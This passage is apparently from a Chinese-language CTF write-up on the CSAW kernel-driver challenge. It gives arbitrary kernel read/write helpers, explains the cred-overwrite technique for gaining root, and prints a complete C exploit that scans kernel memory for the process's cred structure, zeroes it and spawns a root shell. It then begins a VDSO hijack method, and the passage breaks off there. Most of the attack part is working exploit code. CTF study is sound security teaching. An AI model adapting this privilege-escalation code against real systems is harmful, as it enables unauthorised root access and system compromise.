SEEK_SET;</span><br><span class="line">    ioctl(fd, CSAW_SEEK_CHANNEL, &amp;seek_channel);</span><br><span class="line"></span><br><span class="line">    read_channel.id = channel_id;</span><br><span class="line">    read_channel.buf = (<span class="keyword">char</span>*)read_buff;</span><br><span class="line">    read_channel.count = len;</span><br><span class="line">    ioctl(fd, CSAW_READ_CHANNEL, &amp;read_channel);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">WAA</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">int</span> channel_id, <span class="keyword">void</span>* write_buff, <span class="keyword">uint64_t</span> addr, <span class="keyword">uint32_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">seek_channel_args</span> <span class="title">seek_channel</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">write_channel_args</span> <span class="title">write_channel</span>;</span></span><br><span class="line">    <span class="keyword">uint32_t</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;len; i++)&#123;</span><br><span class="line">        seek_channel.id = channel_id;</span><br><span class="line">        seek_channel.index = addr<span class="number">-0x10</span>+i;</span><br><span class="line">        seek_channel.whence = SEEK_SET;</span><br><span class="line">        ioctl(fd, CSAW_SEEK_CHANNEL, &amp;seek_channel);</span><br><span class="line"></span><br><span class="line">        write_channel.id = channel_id;</span><br><span class="line">        write_channel.buf = (<span class="keyword">char</span>*)write_buff+i;</span><br><span class="line">        write_channel.count = <span class="number">1</span>;</span><br><span class="line">        ioctl(fd, CSAW_WRITE_CHANNEL, &amp;write_channel);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>PS：由于驱动使用的 <code>strncpy_from_user</code> 会被 “\x00” 截断，所以 WAA 最好单字节多次输入</li>
</ul>
<p>Cred Attack：</p>
<p>内核结构体 <code>task_struct</code> 用于对进程/线程的所有的相关的信息进行维护，并进行管理：</p>
<ul>
<li>其中有个很重要的条目就是 <code>*cred</code> 指针，内核会根据 <code>cred</code> 结构体的内容来判断一个进程拥有的权限（如果 <code>cred</code> 结构体成员中的 uid-fsgid 都为 0，那一般就会认为进程具有 root 权限）</li>
<li>想要定位 <code>task_struct</code> 结构体中的 <code>cred</code> 指针，需要用到 <code>task_struct</code> 中的另一个条目 <code>comm[TASK_COMM_LEN]</code>：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Objective and real subjective task credentials (COW): */</span></span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span>		*<span class="title">real_cred</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Effective (overridable) subjective task credentials (COW): */</span></span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span>		*<span class="title">cred</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * executable name, excluding path.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * - normally initialized setup_new_exec()</span></span><br><span class="line"><span class="comment"> * - access it with [gs]et_task_comm()</span></span><br><span class="line"><span class="comment"> * - lock it with task_lock()</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">char</span>				comm[TASK_COMM_LEN];</span><br></pre></td></tr></table></figure>
<ul>
<li><code>comm</code> 字符数组就在 <code>*cred</code> 相邻的下方，里面存放的这个字符串表示线程的名字（可以唯一确定），其内容可以通过 linux 的 <code>prctl(PR_SET_NAME,name)</code> 来设置指定的值</li>
<li><code>*real_cred</code> 和 <code>*cred</code> 的值相同，可以用于判断是否找到 <code>*cred</code></li>
<li>如果程序拥有局部 RAA，就可以通过扫描 <code>comm</code> 来找到 <code>*cred</code></li>
</ul>
<p>最后还需要确定一下扫描的范围： </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0xffffffffffffffff</span>  ---+-----------+----------------------------------------------</span><br><span class="line">    <span class="number">8</span>M                 |           | unused hole                                   </span><br><span class="line"><span class="number">0xffffffffff7ff000</span>  ---|-----------+------------| FIXADDR_TOP |-------------------</span><br><span class="line">    <span class="number">1</span>M                 |           |                                               </span><br><span class="line"><span class="number">0xffffffffff600000</span>  ---+-----------+------------| VSYSCALL_ADDR |-----------------</span><br><span class="line">    <span class="number">548</span>K               |           | vsyscalls                                    </span><br><span class="line"><span class="number">0xffffffffff577000</span>  ---+-----------+------------| FIXADDR_START |-----------------</span><br><span class="line">    <span class="number">5</span>M                 |           | hole                                         </span><br><span class="line"><span class="number">0xffffffffff000000</span>  ---+-----------+------------| MODULES_END |------------------- </span><br><span class="line">    <span class="number">1520</span>M              |           | <span class="function"><span class="keyword">module</span> mapping <span class="title">space</span> <span class="params">(MODULES_LEN)</span>           </span></span><br><span class="line"><span class="function">0xffffffffa0000000  ---+-----------+------------| MODULES_VADDR |-----------------</span></span><br><span class="line"><span class="function">    512M               |           | kernel text mapping, from phys 0         </span></span><br><span class="line"><span class="function">0xffffffff80000000  ---+-----------+------------| __START_KERNEL_map |------------</span></span><br><span class="line"><span class="function">    2G                 |           | hole                                 </span></span><br><span class="line"><span class="function">0xffffffff00000000  ---+-----------+----------------------------------------------</span></span><br><span class="line"><span class="function">    64G                |           | EFI region mapping space                     </span></span><br><span class="line"><span class="function">0xffffffef00000000  ---+-----------+----------------------------------------------</span></span><br><span class="line"><span class="function">    444G               |           | hole                                         </span></span><br><span class="line"><span class="function">0xffffff8000000000  ---+-----------+----------------------------------------------</span></span><br><span class="line"><span class="function">    16T                |           | %esp fixup stacks                             </span></span><br><span class="line"><span class="function">0xffffff0000000000  ---+-----------+----------------------------------------------</span></span><br><span class="line"><span class="function">    3T                 |           | hole                                         </span></span><br><span class="line"><span class="function">0xfffffc0000000000  ---+-----------+----------------------------------------------</span></span><br><span class="line"><span class="function">    16T                |           | kasan shadow <span class="title">memory</span> <span class="params">(<span class="number">16</span>TB)</span>                   </span></span><br><span class="line"><span class="function">0xffffec0000000000  ---+-----------+----------------------------------------------</span></span><br><span class="line"><span class="function">    1T                 |           | hole                                         </span></span><br><span class="line"><span class="function">0xffffeb0000000000  ---+-----------+----------------------------------------------</span></span><br><span class="line"><span class="function">    1T                 |           | <span class="keyword">virtual</span> memory <span class="built_in">map</span> <span class="keyword">for</span> all of struct pages   </span></span><br><span class="line"><span class="function">0xffffea0000000000  ---+-----------+------------| VMEMMAP_START |-----------------</span></span><br><span class="line"><span class="function">    1T                 |           | hole                                        </span></span><br><span class="line"><span class="function">0xffffe90000000000  ---+-----------+------------| VMALLOC_END   |-----------------</span></span><br><span class="line"><span class="function">    32T                |           | vmalloc/<span class="title">ioremap</span> <span class="params">(<span class="number">1</span> &lt;&lt; VMALLOC_SIZE_TB)</span>       </span></span><br><span class="line"><span class="function">0xffffc90000000000  ---+-----------+------------| VMALLOC_START |-----------------</span></span><br><span class="line"><span class="function">    1T                 |           | hole                                         </span></span><br><span class="line"><span class="function">0xffffc80000000000  ---+-----------+---------------------------------------------- </span></span><br><span class="line"><span class="function">    64T                |           | direct mapping of all phys. memory           </span></span><br><span class="line"><span class="function">                       |           | <span class="params">(<span class="number">1</span> &lt;&lt; MAX_PHYSMEM_BITS)</span>                       </span></span><br><span class="line"><span class="function">0xffff880000000000 ----+-----------+-----------| __PAGE_OFFSET_BASE | ------------</span></span><br><span class="line"><span class="function">    8T                 |           | guard hole, reserved <span class="keyword">for</span> hypervisor           </span></span><br><span class="line"><span class="function">0xffff800000000000 ----+-----------+----------------------------------------------</span></span><br><span class="line"><span class="function">                       |-----------| hole caused by [48:63] sign extension   </span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x0000800000000000</span> ----+-----------+----------------------------------------------</span><br><span class="line">    PAGE_SIZE          |           | guard page                                   </span><br><span class="line"><span class="number">0x00007ffffffff000</span> ----+-----------+--------------| TASK_SIZE_MAX | -------------- </span><br><span class="line">    <span class="number">128</span>T               |           | different per mm                            </span><br><span class="line"><span class="number">0x0000000000000000</span> ----+-----------+----------------------------------------------</span><br></pre></td></tr></table></figure>
<ul>
<li>直接映射区：0xffff880000000000 ~ 0xffffc80000000000（使用 kmalloc，分配的内存物理地址是连续的，虚拟地址也是连续的）</li>
<li>动态映射区：0xffffc90000000000 ~ 0xffffe90000000000（使用 vmalloc，分配的内存物理地址是不连续的，虚拟地址是连续的）</li>
<li>PS：<code>cred</code> 使用直接映射区</li>
</ul>
<p>完整 exp 如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/auxv.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_IOCTL_BASE     0x77617363</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_ALLOC_CHANNEL  CSAW_IOCTL_BASE+1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_OPEN_CHANNEL   CSAW_IOCTL_BASE+2</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_GROW_CHANNEL   CSAW_IOCTL_BASE+3</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_SHRINK_CHANNEL CSAW_IOCTL_BASE+4</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_READ_CHANNEL   CSAW_IOCTL_BASE+5</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_WRITE_CHANNEL  CSAW_IOCTL_BASE+6</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_SEEK_CHANNEL   CSAW_IOCTL_BASE+7</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_CLOSE_CHANNEL  CSAW_IOCTL_BASE+8</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">die</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    perror(msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">alloc_channel_args</span> &#123;</span></span><br><span class="line">    <span class="keyword">size_t</span> buf_size;</span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">open_channel_args</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">grow_channel_args</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">size_t</span> size;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">shrink_channel_args</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">size_t</span> size;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">read_channel_args</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">char</span> *buf;</span><br><span class="line">    <span class="keyword">size_t</span> count;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">write_channel_args</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">char</span> *buf;</span><br><span class="line">    <span class="keyword">size_t</span> count;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">seek_channel_args</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">loff_t</span> index;</span><br><span class="line">    <span class="keyword">int</span> whence;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">close_channel_args</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">RAA</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">int</span> channel_id, <span class="keyword">void</span> *read_buff, <span class="keyword">uint64_t</span> addr, <span class="keyword">uint32_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">seek_channel_args</span> <span class="title">seek_channel</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">read_channel_args</span> <span class="title">read_channel</span>;</span></span><br><span class="line">    </span><br><span class="line">    seek_channel.id = channel_id;</span><br><span class="line">    seek_channel.index = addr<span class="number">-0x10</span>;</span><br><span class="line">    seek_channel.whence = SEEK_SET;</span><br><span class="line">    ioctl(fd, CSAW_SEEK_CHANNEL, &amp;seek_channel);</span><br><span class="line"></span><br><span class="line">    read_channel.id = channel_id;</span><br><span class="line">    read_channel.buf = (<span class="keyword">char</span>*)read_buff;</span><br><span class="line">    read_channel.count = len;</span><br><span class="line">    ioctl(fd, CSAW_READ_CHANNEL, &amp;read_channel);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">WAA</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">int</span> channel_id, <span class="keyword">void</span>* write_buff, <span class="keyword">uint64_t</span> addr, <span class="keyword">uint32_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">seek_channel_args</span> <span class="title">seek_channel</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">write_channel_args</span> <span class="title">write_channel</span>;</span></span><br><span class="line">    <span class="keyword">uint32_t</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;len; i++)&#123;</span><br><span class="line">        seek_channel.id = channel_id;</span><br><span class="line">        seek_channel.index = addr<span class="number">-0x10</span>+i;</span><br><span class="line">        seek_channel.whence = SEEK_SET;</span><br><span class="line">        ioctl(fd, CSAW_SEEK_CHANNEL, &amp;seek_channel);</span><br><span class="line"></span><br><span class="line">        write_channel.id = channel_id;</span><br><span class="line">        write_channel.buf = (<span class="keyword">char</span>*)write_buff+i;</span><br><span class="line">        write_channel.count = <span class="number">1</span>;</span><br><span class="line">        ioctl(fd, CSAW_WRITE_CHANNEL, &amp;write_channel);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">20</span>];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">alloc_channel_args</span> <span class="title">channel_alloc</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">shrink_channel_args</span> <span class="title">channel_shrink</span>;</span></span><br><span class="line">    <span class="keyword">int</span> channel_id;</span><br><span class="line">    <span class="keyword">char</span> * read_buff = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">char</span> * target = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">size_t</span> cred_addr = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">size_t</span> real_cred_addr = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">char</span> root_cred[<span class="number">28</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">&quot;/dev/csaw&quot;</span>,O_RDWR);</span><br><span class="line">    <span class="keyword">if</span>(fd &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        die(<span class="string">&quot;open error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    read_buff = (<span class="keyword">char</span>*)<span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(name,<span class="string">&quot;try2findmesauce&quot;</span>);</span><br><span class="line">    prctl(PR_SET_NAME,name);</span><br><span class="line"></span><br><span class="line">    channel_alloc.buf_size = <span class="number">0x100</span>;</span><br><span class="line">    channel_alloc.id = <span class="number">-1</span>;</span><br><span class="line">    ioctl(fd,CSAW_ALLOC_CHANNEL,&amp;channel_alloc);</span><br><span class="line">    <span class="keyword">if</span>(channel_alloc.id == <span class="number">-1</span>)&#123;</span><br><span class="line">        die(<span class="string">&quot;alloc channel wrong&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;alloc channel id is :%d\n&quot;</span>,channel_alloc.id);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    channel_id = channel_alloc.id;</span><br><span class="line">    channel_shrink.id = <span class="number">1</span>;</span><br><span class="line">    channel_shrink.size = <span class="number">0x101</span>;</span><br><span class="line">    ioctl(fd,CSAW_SHRINK_CHANNEL,&amp;channel_shrink);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">size_t</span> addr = <span class="number">0xffff880000000000</span>;addr &lt; <span class="number">0xffffc80000000000</span>;addr+=<span class="number">0x1000</span>)&#123;</span><br><span class="line">        RAA(fd,channel_id,read_buff,addr,<span class="number">0x1000</span>);</span><br><span class="line">        target = memmem(read_buff,<span class="number">0x1000</span>,name,<span class="number">16</span>);</span><br><span class="line">        <span class="keyword">if</span>(target != <span class="literal">NULL</span>)&#123;</span><br><span class="line">            cred_addr = *(<span class="keyword">size_t</span> *)(target - <span class="number">0x8</span>);</span><br><span class="line">            real_cred_addr =  *(<span class="keyword">size_t</span> *)(target - <span class="number">0x10</span>);</span><br><span class="line">            <span class="keyword">if</span>(cred_addr == real_cred_addr)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;found cred at 0x%lx\n&quot;</span>,addr+target-(<span class="keyword">size_t</span>)read_buff);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;cred at 0x%lx\n&quot;</span>,cred_addr);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(cred_addr == <span class="number">-1</span>)&#123;</span><br><span class="line">        die(<span class="string">&quot;not find cred&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    WAA(fd,channel_id,root_cred,cred_addr,<span class="number">28</span>);</span><br><span class="line">    <span class="keyword">if</span>(getuid() == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;win~~~\n&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        die(<span class="string">&quot;fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>VDSO Attack：（Ret2dir 的一种）</p>
<p>VDSO 是内核为了减少内核与用户空间频繁切换，提高系统调用效率而提出的机制，支持的系统调用有4个：</p>
<ul>
<li>gettimeofday()：把时间包装为一个结构体返回，包括秒，微妙，时区等信息</li>
<li>time()：获取当前的系统时间，返回一个大整数 </li>
<li>getcpu()：获取CPU信息</li>
<li>clock_gettime()：用于计算精度和纳秒</li>
</ul>
<p>入侵的思路很简单，就是利用 WAA 把 vdso 中用于替代系统调用的函数劫持为 shellcode，然后调用这些函数，获取 VDSO 基地址有如下步骤：</p>
<ul>
<li>在高版本的 glibc 中，读取 ELF 辅助向量，计算 <code>gettimeofday</code> 字符串的偏移，用于在后续的爆破中判断是否找到 VDSO 基地址</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">get_gettimeofday_str_offset</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> vdso_addr = getauxval(AT_SYSINFO_EHDR);</span><br><span class="line">    <span class="keyword">char</span>* name = <span class="string">&quot;gettimeofday&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (!vdso_addr)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;error get name&#x27;s offset&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;vdso_addr in user: 0x%lx\n&quot;</span>,vdso_addr);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">size_t</span> name_addr = memmem(vdso_addr, <span class="number">0x1000</span>, name, <span class="built_in">strlen</span>(name));</span><br><span class="line">    <span class="keyword">if</span> (name_addr &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;error get name&#x27;s offset&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> name_addr - vdso_addr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>爆破获得 VDSO 地址，VDSO 是按页对齐的，且映射到空间的是个ELF文件</li>
</ul>
